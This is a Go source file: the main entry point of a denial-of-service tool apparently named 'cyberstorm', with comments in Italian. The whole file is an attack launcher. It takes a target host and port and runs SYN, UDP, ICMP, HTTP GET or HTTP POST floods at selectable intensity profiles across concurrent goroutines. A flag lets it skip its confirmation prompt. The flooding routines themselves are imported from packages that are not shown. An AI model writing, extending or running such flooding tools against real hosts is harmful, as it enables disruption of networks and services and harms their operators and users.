package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"cyberstorm/attacks"
	"cyberstorm/core"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	// Stampa una frase casuale
	core.PrintRandomPhrase()

	// Definisci i flag CLI
	host := flag.String("host", "", "destination IP or URL")
	port := flag.Int("port", 0, "destination port (non necessario per ICMP flood)")
	attack := flag.String("attack", "syn-flood", "type of attack (syn-flood, udp-flood, icmp-flood, http-get-flood, http-post-flood)")
	body := flag.String("body", "", "Body of the POST request (solo per POST flood)")
	userAgent := flag.String("user-agent", "", "Custom User-Agent per HTTP requests")
	duration := flag.Int("duration", 30, "duration of the attack in seconds (necessario solo per ICMP flood e altri)")
	skipConfirmation := flag.Bool("skip-confirmation", false, "Skip confirmation prompt prima di iniziare l'attacco")
	profile := flag.String("profile", "medium", "attack profile (light, medium, extreme)")
	flag.Parse()

	// Controlla che l'host sia specificato
	if *host == "" {
		fmt.Println("Usage: -host <ip or URL> -attack <syn-flood|udp-flood|icmp-flood|http-get-flood|http-post-flood> [-port <port>] [-duration <seconds>] [-profile <light|medium|extreme>] [-body <data>] [-user-agent <user-agent>]")
		os.Exit(1)
	}

	// Gestione speciale per ICMP flood: solo l'host e (opzionalmente) la durata sono necessari
	if *attack == "icmp-flood" {
		fmt.Printf("Launching ICMP flood attack against %s for %d seconds.\n", *host, *duration)

		// Chiedi conferma prima di lanciare l'attacco (se lo switch -skip-confirmation non è presente)
		if !*skipConfirmation {
			fmt.Printf("Are you sure you want to launch the ICMP flood attack against %s? (y/n): ", *host)
			var confirmation string
			fmt.Scanln(&confirmation)
			confirmation = strings.ToLower(confirmation)
			if confirmation != "y" && confirmation != "yes" {
				fmt.Println("Attack aborted.")
				os.Exit(0)
			}
		}

		dstIp := net.ParseIP(*host)
		if dstIp == nil {
			log.Fatalf("Invalid IP address: %s", *host)
		}

		// Crea il raw socket per ICMP
		rawSocket, err := core.NewRawSocket(dstIp)
		if err != nil {
			log.Fatalf("new raw socket: %v", err)
		}
		defer rawSocket.Close()

		// Crea un contesto con timeout
		wg := &sync.WaitGroup{}
		ctx, cancelFunc := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)

		attackFunc := func() {
			err := attacks.SendICMP(rawSocket, dstIp)
			if err != nil {
				log.Printf("Error in ICMP flood: %v", err)
			}
		}

		// Aggiungi il parametro duration alla chiamata a RunGoroutines
		core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration)

		log.Println("press ^C to stop")

		// Gestione del segnale di terminazione
		termChan := make(chan os.Signal, 1)
		signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)

		select {
		case <-termChan:
			log.Println("received termination signal")
			cancelFunc()
			wg.Wait()
		case <-ctx.Done(): // Il contesto scade alla fine della durata
			log.Printf("Attack finished after %d seconds\n", *duration)
			cancelFunc()
			wg.Wait()
		}

		log.Println("done")
		return // Uscire dopo l'attacco ICMP
	}

	// Per tutti gli altri attacchi, è richiesto il parametro port
	if *port == 0 {
		fmt.Println("Port is required for non-ICMP attacks.")
		os.Exit(1)
	}

	// Se non viene specificato un body per il POST, impostiamo un body predefinito
	if *body == "" && *attack == "http-post-flood" {
		*body = "param1=value1&param2=value2"
	}

	// Chiedi conferma prima di lanciare l'attacco (se lo switch -skip-confirmation non è presente)
	if !*skipConfirmation {
		fmt.Printf("Are you sure you want to launch the %s attack against %s:%d? (y/n): ", *attack, *host, *port)
		var confirmation string
		fmt.Scanln(&confirmation)
		confirmation = strings.ToLower(confirmation)
		if confirmation != "y" && confirmation != "yes" {
			fmt.Println("Attack aborted.")
			os.Exit(0)
		}
	}

	dstIp := net.ParseIP(*host)
	if dstIp == nil {
		log.Fatalf("Invalid IP address: %s", *host)
	}

	wg := &sync.WaitGroup{}
	ctx, cancelFunc := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)

	// Definisci la funzione di attacco in base al tipo di attacco scelto
	var attackFunc func()

	switch *attack {
	case "syn-flood":
		rawSocket, err := core.NewRawSocket(dstIp)
		if err != nil {
			log.Fatalf("new raw socket: %v", err)
		}
		defer rawSocket.Close()

		dstPort := uint16(*port)
		attackFunc = func() {
			err := attacks.SendSYN(rawSocket, dstIp, dstPort)
			if err != nil {
				log.Printf("Error in SYN flood: %v", err)
			}
		}
	case "udp-flood":
		attackFunc = func() {
			attacks.SendUDPFlood(*host, *port, wg, ctx)
		}
	case "http-get-flood":
		attackFunc = func() {
			attacks.SendHTTPGet(*host, *userAgent, wg, ctx)
		}
	case "http-post-flood":
		attackFunc = func() {
			attacks.SendHTTPPost(*host, *body, *userAgent, wg, ctx)
		}
	default:
		log.Fatalf("Unsupported attack type: %s", *attack)
	}

	// Aggiungi il parametro duration alla chiamata a RunGoroutines
	core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration)

	log.Println("press ^C to stop")

	// Gestione del segnale di terminazione
	termChan := make(chan os.Signal, 1)
	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-termChan:
		log.Println("received termination signal")
		cancelFunc()
		wg.Wait()
	case <-ctx.Done(): // Il contesto scade alla fine della durata
		log.Printf("Attack finished after %d seconds\n", *duration)
		cancelFunc()
		wg.Wait()
	}

	log.Println("done")
}
